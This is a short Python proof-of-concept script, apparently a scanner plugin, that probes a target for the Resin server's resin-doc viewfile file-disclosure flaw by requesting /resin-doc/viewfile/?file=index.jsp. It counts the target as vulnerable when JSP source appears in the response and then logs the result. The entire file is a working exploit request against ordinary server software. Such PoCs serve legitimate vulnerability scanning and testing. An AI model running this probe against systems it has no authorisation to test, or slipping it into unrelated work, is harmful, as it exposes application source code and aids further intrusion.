#!/usr/bin/env python
# coding=utf-8
import requests
from report.report import save

pocname = "resin-index"
headers = {'Content-Type': 'application/x-www-form-urlencoded','User_Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'}

def verify(arg, **kwargs):
	exploit = "/resin-doc/viewfile/?file=index.jsp"
	try:
		r = requests.get(url=arg+exploit,headers=headers)
		if "&lt;%@" in r.text and "resin" in r.text:
			save(arg,pocname,exploit)
			return {"url": arg, "poc-name":pocname, "exploit": exploit}
	except Exception as e:
		pass